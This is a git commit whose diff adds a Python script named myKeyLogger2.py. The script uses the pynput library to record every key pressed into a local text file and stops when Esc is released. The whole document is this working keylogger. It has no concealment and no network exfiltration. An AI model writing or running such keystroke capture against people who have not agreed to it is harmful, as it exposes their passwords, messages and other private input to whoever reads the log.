ed80c9693f0d5aa9fbc00ee121ff4eb684d1cfaf
Bill <207559339@qq.com>
2020-01-11 14:05:24 +0800

    improved

---
+++ myKeyLogger2.py
@@ -0,0 +1,17 @@
+import pynput
+
+from pynput.keyboard import Key, Listener
+
+def write_file(key):
+    with open("myLog2.txt", "a") as f:
+        k = str(key).replace("'","").replace("Key.space"," ")
+        if k[:3] == "Key":
+            k = k.replace("Key", "\n") + "\n"
+        f.write(k)
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+with Listener(on_press=write_file, on_release=on_release) as listener:
+    listener.join()
